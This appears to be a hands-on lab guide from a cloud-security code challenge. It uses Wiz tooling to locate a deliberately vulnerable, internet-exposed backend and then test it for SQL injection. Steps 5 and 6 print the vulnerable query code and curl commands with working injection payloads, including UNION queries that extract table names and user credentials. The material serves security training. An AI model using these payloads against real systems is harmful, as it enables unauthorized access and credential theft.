# **Phase 1: Manual Penetration Testing (Wiz-Enhanced)** 🔍

### **Objective**
Manually identify and exploit the SQL injection vulnerability using Wiz intelligence to guide your penetration testing strategy.

---

### **Step 1: Wiz-Powered Target Identification**

**Use Wiz to find your attack surface:**

**In Wiz Portal:**
1. Navigate to: **Inventory → Cloud Resources**
2. Filter:
   - Subscription = `TF-AWS-Connector-CodeChallange`
   - Type = `LOAD_BALANCER`
3. Find: `k8s-wiztopiagroup-71f1d9cc2d`

**Question:** What is the external DNS endpoint for the load balancer?
**Answer:** *(Copy from Wiz resource details)*

**Alternative - Use Wiz Graph Search:**

```
Ask Mika: "Show me all publicly exposed load balancers in subscription TF-AWS-Connector-CodeChallange"
```

---

### **Step 2: Leverage Wiz SAST Intelligence**

**Before testing, review what Wiz already knows:**

**Navigate to:** Code Security → SAST Findings

**Filter:**
- Repository: `itaykz/summit-code-challenge-backend`
- Severity: HIGH, CRITICAL
- Status: OPEN

**Question:** What vulnerabilities did Wiz SAST detect?
**Answer:**
1. ✅ **SQL Injection** - `app/main.py:64` (Unparameterized SQL Query)
2. ⚠️ **Unsafe YAML Deserialization** - `app/main.py:85`
3. ⚠️ **Insecure CORS** - `app/main.py:24`

**Click on the SQL Injection finding to see:**
- Exact file path and line number
- Vulnerable code snippet
- CWE classification (CWE-89)
- OWASP mapping (A03:2021 / A05:2025)

**Pro Tip:** Use this intelligence to craft targeted payloads!

---

### **Step 3: Map Code to Runtime with Wiz**

**Understand what's actually deployed:**

**Ask Mika:**

```
"Show me all cloud resources deployed from repository itaykz/summit-code-challenge-backend"
```

**Or navigate to:** Code to Cloud → Correlations

**Question:** Which container image was built from this repository?
**Answer:** `800618367342.dkr.ecr.us-east-1.amazonaws.com/sorcery-solutions-backend@bbd5a30f`

**Question:** Where is this container running?
**Answer:**
- **Cluster:** `sorcery-demo` (EKS)
- **Namespace:** `default`
- **Container:** `sorcery-solutions-backend`

**Use Wiz to find the container:**

```
Navigate to: Inventory → Containers
Filter: Name contains "sorcery-solutions-backend"
```

---

### **Step 4: Wiz Network Exposure Analysis**

**Before attacking, understand the network path:**

**Ask Mika:**

```
"Show me the network exposure path for container sorcery-solutions-backend"
```

**Or use Graph Search:**

```
"Find all publicly exposed containers in subscription TF-AWS-Connector-CodeChallange"
```

**Question:** How is the backend container exposed to the internet?
**Answer:**

```
Internet (0.0.0.0/0) → Load Balancer (k8s-wiztopiagroup-71f1d9cc2d)
→ Kubernetes Service → Pod (sorcery-solutions-backend)
```

**Verify exposure in Wiz:**
- Navigate to: **Security Graph → Network Exposure**
- Filter: Exposed Entity = `sorcery-solutions-backend`

---

### **Step 5: Wiz-Guided Vulnerability Testing**

**Now that you know WHAT and WHERE, test the HOW:**

**From Wiz SAST finding, you know:**
- **File:** `app/main.py`
- **Line:** 64
- **Vulnerability:** Unparameterized SQL Query
- **Pattern:** Direct string concatenation in SQL

**Click "View Code" in Wiz to see the vulnerable code:**

```python
# Line 64 - VULNERABLE CODE (from Wiz SAST)
query = f"SELECT * FROM users WHERE username = '{username}'"
cursor.execute(query)
```

**Based on this intelligence, craft your attack:**

```bash
# Get the load balancer endpoint from Wiz
ENDPOINT="<LOAD_BALANCER_DNS_FROM_WIZ>"

# Test 1: Confirm the endpoint is accessible
curl -I http://$ENDPOINT

# Test 2: Identify the vulnerable endpoint
# (Wiz shows it's in a login/user query context)
curl -X POST http://$ENDPOINT/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "test"}'

# Test 3: SQL Injection - Boolean-based blind
curl -X POST http://$ENDPOINT/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' OR '\''1'\''='\''1", "password": "anything"}'

# Test 4: SQL Injection - Union-based
curl -X POST http://$ENDPOINT/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' UNION SELECT NULL,NULL,NULL--", "password": "test"}'

# Test 5: SQL Injection - Time-based blind
curl -X POST http://$ENDPOINT/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' AND SLEEP(5)--", "password": "test"}'
```

**Question:** Which payload successfully exploited the SQL injection?
**Answer:** *(Document your successful payload)*

---

### **Step 6: Wiz-Enhanced Exploitation**

**Use Wiz to understand the data at risk:**

**Navigate to:** Data Security → Data Findings

**Filter:**
- Resource: Container `sorcery-solutions-backend`
- Or: Subscription = `TF-AWS-Connector-CodeChallange`

**Question:** What sensitive data does Wiz detect in this environment?
**Answer:** *(Check for PII, credentials, financial data)*

**Now extract that data using SQL injection:**

```bash
# Extract database version
curl -X POST http://$ENDPOINT/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' UNION SELECT @@version,NULL,NULL--", "password": "test"}'

# Extract table names
curl -X POST http://$ENDPOINT/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--", "password": "test"}'

# Extract user credentials (based on Wiz data classification)
curl -X POST http://$ENDPOINT/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' UNION SELECT username,password,email FROM users--", "password": "test"}'
```

---

### **Step 7: Wiz Issue Correlation**

**Check if Wiz already flagged this as a security issue:**

**Navigate to:** Issues → Risk Issues

**Filter:**
- Resource: `sorcery-solutions-backend`
- Or: Search for "SQL Injection"

**Ask Mika:**

```
"Show me all security issues for container sorcery-solutions-backend"
```

**Question:** Did Wiz create a security issue for this vulnerability?
**Answer:** *(Check if there's an issue combining SAST finding + exposure)*

**Typical Wiz Issue:**

```
🔴 CRITICAL: SQL Injection in Publicly Exposed Container
- SAST Finding: Unparameterized SQL Query (app/main.py:64)
- Exposure: Internet-accessible via Load Balancer
- Risk: Data breach, unauthorized access
- Affected Resource: sorcery-solutions-backend
```

---

### **Step 8: Wiz-Powered Impact Analysis**

**Use Wiz to assess the blast radius:**

**Ask Mika:**

```
"What other resources have access to the same data as sorcery-solutions-backend?"
```

**Or use Graph Search:**

```
"Find all resources with access to the same database as container sorcery-solutions-backend"
```

**Question:** If this SQL injection is exploited, what else is at risk?
**Answer:** *(Use Wiz graph to map lateral movement possibilities)*
